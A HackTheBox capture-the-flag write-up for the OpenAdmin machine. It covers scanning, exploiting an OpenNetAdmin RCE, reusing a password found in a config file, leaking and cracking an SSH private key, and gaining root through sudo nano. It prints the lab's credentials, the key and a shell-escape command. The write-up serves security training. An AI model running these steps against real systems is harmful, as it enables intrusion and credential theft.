# OpenAdmin | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-s3y2txzu6h]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.84.189
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-17 13:21 UTC
Nmap scan report for 10.129.84.189
Host is up (0.22s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/17%OT=22%CT=1%CU=42282%PV=Y%DS=2%DC=T%G=Y%TM=60043A6
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.21 ms 10.10.14.1
2   223.34 ms 10.129.84.189

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.68 seconds
```
The machione is running SSH and an Apache 2.4.29 web server.

### 2. Enumeration
Navigating the the web server's homepage, it is the "Apache2 Ubuntu Default Page", which doesn't really yield any additional information.  
Do some dirbusting:
```bash
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-s3y2txzu6h]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ gobuster dir -u http://10.129.84.189/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.84.189/
[+] Threads:        20
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/17 13:27:12 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/17 14:09:32 Finished
===============================================================
```
All of these directories appear to contain default website templates. Whilst clicking through them to find any additions, I notice that the "login" link for the "music" site directs to 10.129.84.189/ona.  
Going to this location gives me access to an OpenNetAdmin page where I can view details on the current network setup on the machine. I can also see it is version 18.1.1, which is not current, and there is an RCE vulnerability that can be exploited.

### 3. Get a shell
Reference: https://packetstormsecurity.com/files/155406/opennetadmin1811-exec.txt
  
Using the existing bash proof-of-concept, created a python script to exploit with (see onaexploit.py). This effectively gives me a "HTTP" shell on the machine.
```bash
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-f3sulshaud]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ ./onaexploit.py http://10.129.85.46/ona
Open Network Access Exploit Tool

/opt/ona/www$ whoami
www-data
```

### 4. Enumeration
As is normally the case with www-data I start enueration with the accessable website files.
```bash
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-f3sulshaud]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ python3 onaexploit.py http://10.129.85.46/ona/
Open Network Access Exploit Tool

/opt/ona/www$ ls /var/www/
html
internal
ona

/opt/ona/www$ ls /var/www/internal
ls: cannot open directory '/var/www/internal': Permission denied
```
The "html" folder contains all static templates, the ona directory is all the ona stuff obviously, and then the internal directory I can't read. This is because it is owned by jimmy of the "internal" group.  
I am able to find the username and password to an SQL database.
```bash
/opt/ona/www$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```
I try to use these credentials to log into the database, but no luck:
```bash
/opt/ona/www$ mysql -u ona_sys --password n1nj4W4rri0R! -D ona_default -e "show tables;"
Enter password: ERROR 1045 (28000): Access denied for user 'ona_sys'@'localhost' (using password: NO)
```
However I can re-use the password for SSH, getting the users from the home directory.
```bash
/opt/ona/www$ ls /home/
jimmy
joanna
```

### 5. Get SSH access
The password is reused and gives access to the "jimmy" account.
```bash
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-f3sulshaud]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ ssh jimmy@10.129.85.46
The authenticity of host '10.129.85.46 (10.129.85.46)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.85.46' (ECDSA) to the list of known hosts.
jimmy@10.129.85.46's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 18 03:14:01 UTC 2021

  System load:  0.0               Processes:             114
  Usage of /:   49.4% of 7.81GB   Users logged in:       0
  Memory usage: 18%               IP address for ens160: 10.129.85.46
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ whoami
jimmy
```

### 6. Continue enumeration
From here I can now access the internal directory in var/www.
```bash
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
It seems as though if I can access this page somehow, I will be able to retrieve joanna's SSH key. Looking at index.php, I can see some login credentials are hardcoded.
```bash
jimmy@openadmin:/var/www/internal$ cat index.php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

...

          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```
The SHA512 hash cracks online, and another credential pair for jimmy is found: `jimmy:Revealed`.

### 7. Get the SSH key for joanna
To see which port the site is listening on, I can view the apache configuration for it.
```bash
jimmy@openadmin:/var/www/internal$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
The site is on port 52846. I can curl main.php to get the private SSH key.
```bash
jimmy@openadmin:/var/www/internal$ curl -X POST http://localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

### 8. Recover the joanna key password
Although the hint for the password is that it is a "ninja" password, the ninjawarrior password doesn't work. I can attempt to crack the key password.
```bash
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-f3sulshaud]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ /usr/share/john/ssh2john.py joanna.key > joanna_john.key
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-f3sulshaud]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ cat joanna_john.key 
joanna.key:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-f3sulshaud]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ john --wordlist=/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt joanna_john.key 
Created directory: /home/htb-jib1337/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna.key)
Warning: Only 1 candidate left, minimum 4 needed for performance.
1g 0:00:00:05 DONE (2021-01-18 04:45) 0.1721g/s 2468Kp/s 2468Kc/s 2468KC/s *7¡Vamos!
Session completed
```
The password is found to be `bloodninjas`.

### 9. Lateral movement to joanna
Login as Joanna via SSH using the key.
```bash
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-f3sulshaud]─[~/writeups/HackTheBox/HTB_OpenAdmin]
└──╼ [★]$ ssh -i joanna.key joanna@10.129.85.46
Enter passphrase for key 'joanna.key': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 18 04:51:05 UTC 2021

  System load:  0.02              Processes:             118
  Usage of /:   49.7% of 7.81GB   Users logged in:       0
  Memory usage: 28%               IP address for ens160: 10.129.85.46
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ whoami
joanna
```

### 10. Enumeration from user
Running `sudo -l` shows that joanna can run nano with /opt/priv as an argument
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
Nano is able to run system commands provided by the user, so privilege escalation can be done just by having the ability to run it as root.

### 11. Escalate to root
Run nano, then do Ctrl+R to read a file, and then Ctrl+X to execute a command.  
Run the command: `reset; /bin/bash 1>&0 2>&0`. This spawns a shell.
```bash
root@openadmin:~# whoami
root
```
